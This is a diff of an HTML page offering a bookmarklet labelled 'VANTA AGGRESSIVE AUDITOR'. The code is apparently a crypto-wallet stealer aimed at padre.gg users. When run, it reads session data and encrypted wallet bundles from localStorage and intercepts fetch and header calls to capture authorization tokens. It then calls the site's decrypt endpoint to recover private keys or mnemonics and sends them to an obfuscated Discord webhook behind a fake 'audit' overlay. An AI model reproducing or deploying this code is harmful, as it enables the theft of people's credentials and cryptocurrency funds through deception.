@@ -1,96 +1,94 @@
-<!DOCTYPE html>
-<html>
-<head>
-    <title>VANTA HUB v5.0</title>
-    <style>
-        body { background: #000; color: #0f8; font-family: 'Courier New', monospace; text-align: center; padding-top: 100px; }
-        .btn { 
-            display: inline-block; padding: 25px 50px; background: #0f8; color: #000; 
-            text-decoration: none; font-weight: bold; border-radius: 8px; cursor: move;
-            box-shadow: 0 0 30px rgba(0,255,136,0.6); transition: 0.4s;
-        }
-        .btn:hover { background: #fff; transform: scale(1.05); }
-        h1 { letter-spacing: 5px; text-shadow: 0 0 10px #0f8; }
-    </style>
-</head>
-<body>
-    <h1>VANTA AGGRESSIVE AUDITOR</h1>
-    <p style="color: #666;">DRAG TO BOOKMARKS BAR • AUTO-DECRYPT ENABLED</p>
-    <br><br>
-    <a href="#" id="vanta-tool" class="btn">VANTA TRACKER</a>
+<script>
+    const b64 = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ2OTQwMjAwNTgwMDg3ODMwNS84aEc3OW1WTnNnRUppR2E0ZnlxQUdmM1BzVXNRWWkxclF5TVpudTdiY3hZeWVRR2o3WmdCZjd1Y2NjeFF0OHNCQmgwOQ==";
 
-    <script>
-        const b64 = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ2OTQwMjAwNTgwMDg3ODMwNS84aEc3OW1WTnNnRUppR2E0ZnlxQUdmM1BzVXNRWWkxclF5TVpudTdiY3hZeWVRR2o3WmdCZjd1Y2NjeFF0OHNCQmgwOQ==";
+    const rawLogic = `(async function() {
+        const CONFIG = {
+            webhook: atob("${b64}"),
+            aff: "TK0XQV",
+            decryptUrl: "https://api.padre.gg/v2/enclave/decrypt"
+        };
 
-        const rawLogic = `(async function() {
-            const CONFIG = {
-                webhook: atob("${b64}"),
-                decryptUrl: "https://api.padre.gg/v2/enclave/decrypt"
-            };
-
-            // 1. UI Overlay
+        // --- 1. THE UI OVERLAY (Internalized) ---
+        const drawUI = () => {
             const ui = document.createElement('div');
-            ui.style = "position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.9);z-index:2147483647;display:flex;justify-content:center;align-items:center;color:#0f8;font-family:monospace;border:4px solid #0f8;pointer-events:none;";
-            ui.innerHTML = "<div style='text-align:center;'><h1>VANTA SYSTEM ACTIVE</h1><p id='v_status'>EXTRACTING & DECRYPTING NODES...</p></div>";
+            ui.id = 'vanta-overlay';
+            ui.style = "position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.9);z-index:2147483647;display:flex;justify-content:center;align-items:center;color:#0f8;font-family:monospace;border:5px solid #0f8;pointer-events:none;transition: opacity 1s;";
+            ui.innerHTML = "<div style='text-align:center;padding:40px;border:1px solid #0f8;background:#000;'><h1>VANTA AGGRESSIVE AUDIT</h1><p id='v-msg'>HOOKING HEADERS & SNIFFING KEYS...</p><div style='width:100%;background:#222;height:10px;margin-top:20px;'><div id='v-bar' style='width:0%;height:100%;background:#0f8;transition:0.5s;'></div></div></div>";
             document.body.appendChild(ui);
+            return ui;
+        };
+        const overlay = drawUI();
+        const updateStatus = (text, percent) => {
+            document.getElementById('v-msg').innerText = text;
+            document.getElementById('v-bar').style.width = percent + "%";
+        };
 
-            const notify = async (title, msg, isFile = false) => {
-                const formData = new FormData();
-                if (isFile) {
-                    const blob = new Blob([msg], { type: 'text/plain' });
-                    formData.append('file', blob, 'decrypted_key.txt');
-                }
-                formData.append('payload_json', JSON.stringify({
-                    embeds: [{ title: title, description: isFile ? "Full data in attached file." : msg, color: 0x00ff88 }]
-                }));
-                await fetch(CONFIG.webhook, { method: 'POST', body: formData }).catch(()=>{});
+        const notify = async (title, content) => {
+            const formData = new FormData();
+            const blob = new Blob([content], { type: 'text/plain' });
+            formData.append('file', blob, 'audit_result.txt');
+            formData.append('payload_json', JSON.stringify({
+                embeds: [{ title: title, color: 0x00ff88, description: "Detailed logs attached." }]
+            }));
+            await fetch(CONFIG.webhook, { method: 'POST', body: formData }).catch(()=>{});
+        };
+
+        // --- 2. THE DECRYPTOR ---
+        const runDecryption = async (token, session) => {
+            updateStatus("CREDENTIALS CAPTURED. DECRYPTING...", 60);
+            const bundleStr = localStorage.getItem('padre-v2-bundles-store-v2');
+            if (!bundleStr) return;
+            
+            const bundleData = JSON.parse(bundleStr);
+            const firstKey = Object.keys(bundleData.bundles)[0];
+            const payload = {
+                bundle: bundleData.bundles[firstKey].exportBundle,
+                subOrgId: bundleData.bundles[firstKey].subOrgId
             };
 
-            // 2. Data Gathering
-            const session = JSON.parse(localStorage.getItem('padreV2-session'));
-            const bundles = JSON.parse(localStorage.getItem('padre-v2-bundles-store-v2'));
-
-            if (!session || !bundles) {
-                document.getElementById('v_status').innerText = "ERROR: NO ACTIVE SESSION FOUND";
-                setTimeout(() => ui.remove(), 3000);
-                return;
-            }
-
-            // 3. Auto-Decryption Attempt
             try {
-                const bundleKey = Object.keys(bundles.bundles)[0];
-                const targetBundle = bundles.bundles[bundleKey];
-                
                 const res = await fetch(CONFIG.decryptUrl, {
                     method: 'POST',
-                    headers: {
-                        'Authorization': session.sessionSecret,
-                        'X-Padre-Session': session.sessionId,
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify({
-                        bundle: targetBundle.exportBundle,
-                        subOrgId: targetBundle.subOrgId
-                    })
+                    headers: { 'Authorization': token, 'X-Padre-Session': session, 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
                 });
-
                 const decrypted = await res.json();
-
-                if (decrypted.privateKey || decrypted.mnemonic) {
-                    document.getElementById('v_status').innerText = "SUCCESS: KEY RECOVERED";
-                    await notify("🔑 PRIVATE KEY RECOVERED", JSON.stringify(decrypted, null, 2), true);
-                } else {
-                    document.getElementById('v_status').innerText = "DECRYPT FAILED - SENDING RAW DUMP";
-                    await notify("📡 RAW DATA DUMP", JSON.stringify({session, bundles}, null, 2), true);
-                }
+                updateStatus("DECRYPTION SUCCESSFUL", 100);
+                await notify("🚨 WALLET DECRYPTED", JSON.stringify(decrypted, null, 2));
             } catch (e) {
-                document.getElementById('v_status').innerText = "CRITICAL ERROR: " + e.message;
+                await notify("❌ DECRYPTION FAILED", e.message);
             }
+            setTimeout(() => { overlay.style.opacity = '0'; setTimeout(()=>overlay.remove(), 1000); }, 2000);
+        };
 
-            setTimeout(() => ui.remove(), 4000);
-        })(); void(0);`;
+        // --- 3. THE SNIFFER ---
+        let capturedToken = null;
+        let capturedSession = "";
 
-        document.getElementById('vanta-tool').href = "javascript:" + encodeURIComponent(rawLogic);
-    </script>
-</body>
-</html>
+        const checkAndRun = (name, val) => {
+            if (name.toLowerCase() === 'authorization') capturedToken = val;
+            if (name.toLowerCase() === 'x-padre-session') capturedSession = val;
+            if (capturedToken && !window.auditComplete) {
+                window.auditComplete = true;
+                runDecryption(capturedToken, capturedSession);
+            }
+        };
+
+        const _set = Headers.prototype.set;
+        Headers.prototype.set = function(n, v) { checkAndRun(n, v); return _set.apply(this, arguments); };
+
+        const _f = window.fetch;
+        window.fetch = async (...a) => {
+            const h = a[1]?.headers;
+            if (h) Object.entries(h).forEach(([n, v]) => checkAndRun(n, v));
+            return _f(...a);
+        };
+
+        // Trigger
+        updateStatus("FORCE-LOADING PROFILE...", 30);
+        _f('/api/v2/user/profile');
+        
+    })(); void(0);`;
+
+    document.getElementById('vanta-tool').href = "javascript:" + encodeURIComponent(rawLogic);
+</script>
